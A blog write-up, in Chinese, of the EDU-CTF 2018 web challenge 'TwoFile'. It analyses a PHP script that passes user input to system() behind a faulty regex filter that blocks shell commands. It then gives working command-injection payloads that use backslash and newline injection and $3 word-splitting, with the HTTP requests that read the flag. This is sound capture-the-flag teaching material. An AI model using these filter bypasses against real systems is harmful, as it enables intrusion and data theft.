---
uuid: efa4e0df
title: EDU-CTF 2018 - TwoFile
tags:
  - writeup 
  - web
  - php
categories:
  - Capture The Flag
  - EDU-CTF 2018
date: 2019-02-01 00:00:00
updated: 2019-02-01 00:00:00
---

這題目寫起來很有趣，反斜線看到時覺得好像有問題，卻過一小時後才去確認有沒有問題，前面都在找其他的洞，非常失策

<!--more-->

# [正文]
題目有給 source code

{% codeblock source code lang:js line_number:true %}
<?php
highlight_file(__FILE__);

$file1 = $_GET["f1"];
$file2 = $_GET["f2"];

// WAF
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is", $file1))
  $file1 = "";

if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is", $file2))
  $file2 = "";

// Prevent injection
$file1 = '"' . $file1 . '"';
$file2 = '"' . $file2 . '"';

$cmd = "file $file1 $file2";
system($cmd);
{% endcodeblock %}

## Analysis
1. 觀察 source code，發現在最後會用 system 去執行 `file $file1 $file2`，且 `$file1`，`$file2`的內容會被雙引號包住來防止 injection，如果可以繞過 WAF 和雙引號，就可以控制 system 的內容！

2. 觀察 WAF，可以發現在 preg_match 的 regular expression 中有反斜線的漏洞
  {% codeblock lang:php first_line:7 %}
  // WAF
  if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is", $file1))
    $file1 = "";

  if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|cat|sh|flag|find|grep|echo|w/is", $file2))
    $file2 = "";
  {% endcodeblock %}
  可以看到反斜線的 escape 為 `\\`，但是在 php 中要 escape 反斜線要四個 `\\\\`，這個錯誤會引發後面的 `\n` 也會出錯，`\\|\n` 在 string  escape 變成 `\|\n`，導致在 preg_match 中要 `|\n` 才會被 match 到。這樣就可以使用 {% label primary@反斜線 %} 和 {% label primary@換行符號 %}！
  {% note info %}
  ### Escape backslash in PHP
  根據 [PHP Manual](http://php.net/manual/en/regexp.reference.escape.php) 的說明，PHP 在建構 string 時會先 escape 反斜線一次，所以要表示一個反斜線，會變成 `\\`，在 preg_match 中 pattern 又會在 escape，所以會變成 `\\\\` 才能成功過濾反斜線。
  {% endnote %}

## Payload

知道可以使用反斜線和換行符號，那可以嘗試使用反斜線去 escape 雙引號，換行符號 (%0a) 來讓 system 以為有兩行命令 
{% codeblock lang:php line_number:false %}
$file1 = \
$file2 = %0als\

$cmd = "file "\" "%0als\""

// string escape, $cmd =>
"file "" "
ls""
{% endcodeblock %}

{% note warning %}
### 換行符號
這裡使用 `%0a` 當換行符號，主要是因為傳資料的時候會經過 http，會被 urlencode，%0a 就是 url 中的urlencode 換行符號，另外就是 %0a 本來就不會被 preg_match 批配到換行字元。
{% endnote %}

WAF pattern 的後半段有 `ls|cat|sh|flag|find|grep|echo|w`，這些簡單地用 $3 來 bypass 就好，例如 `ls` ==> `l$3s`

{% codeblock Http request lang:plain line_number:false %}
http://final.kaibro.tw:10002/

# cmd: ls .
GET f1=\ f2=%0al$3s%20.%20\
" : cannot open `" ' (No such file or directory) .: flag index.php

# cmd: ls flag
GET f1=\ f2=%0al$3s%20fl$3ag%20\
" : cannot open `" ' (No such file or directory) flag: flag_15_here.txt

# cmd: cat flag_15_here.txt
GET f1=\ f2=%0ac$3at%20fl$3ag/fl$3ag_15_here.txt%20\
" : cannot open `" ' (No such file or directory) FLAG{e4sy_w4f_byp4s5_0h_y4_XD__}
{% endcodeblock %}

FLAG: `FLAG{e4sy_w4f_byp4s5_0h_y4_XD__}`
